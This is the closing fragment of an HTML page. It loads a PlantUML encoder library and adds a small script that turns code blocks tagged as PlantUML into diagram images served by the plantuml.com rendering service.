<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
<script>
(function(){
  let plantumlPrefix = "language-plantuml";
  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
    let image = document.createElement("IMG");
    image.loading = 'lazy'; 
    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
    code.parentNode.insertBefore(image, code);
    code.style.display = 'none';
  });
})();
</script>

</body>
</html>
